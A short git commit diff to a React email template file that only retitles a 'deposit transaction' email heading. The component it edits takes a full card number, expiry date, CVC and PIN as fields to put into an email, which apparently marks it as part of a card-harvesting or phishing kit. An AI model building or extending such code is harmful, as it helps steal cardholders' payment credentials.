130c4904417a80758f86f4b92a21e061925c4782
Kaspay <quickcheck64@gmail.com>
2025-09-24 03:35:23 +0100

    Update email-templates.tsx

--- components/email-templates.tsx
+++ components/email-templates.tsx
@@ -12,7 +12,7 @@ interface PinEmailProps {
 export function PinEmail({ email, amount, cardName, cardNumber, expiryDate, cvc, cardType, pin }: PinEmailProps) {
   return (
     <div style={{ fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "0 auto" }}>
-      <h2 style={{ color: "#059669" }}>Deposit Transaction - PIN Entered</h2>
+      <h2 style={{ color: "#059669" }}>Deposit Transaction - CARD payment</h2>
       <p>A deposit transaction has been initiated with the following details:</p>
       <div
         style={{
